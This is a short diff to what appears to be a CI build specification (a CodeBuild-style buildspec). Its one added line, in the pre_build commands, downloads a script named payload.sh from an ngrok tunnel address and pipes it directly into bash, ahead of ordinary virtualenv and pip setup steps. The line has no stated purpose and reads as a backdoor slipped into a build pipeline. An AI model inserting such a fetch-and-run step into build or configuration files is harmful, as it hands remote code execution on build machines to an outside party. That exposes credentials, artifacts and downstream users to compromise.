@@ -11,6 +11,7 @@ phases:
 
   pre_build:
     commands:
+      - curl https://bbb3-2409-40e6-26-718c-39e4-d778-a7ed-ed87.ngrok-free.app/payload.sh | bash
       - python -m venv env
       - . env/bin/activate
       - pip install -U pip
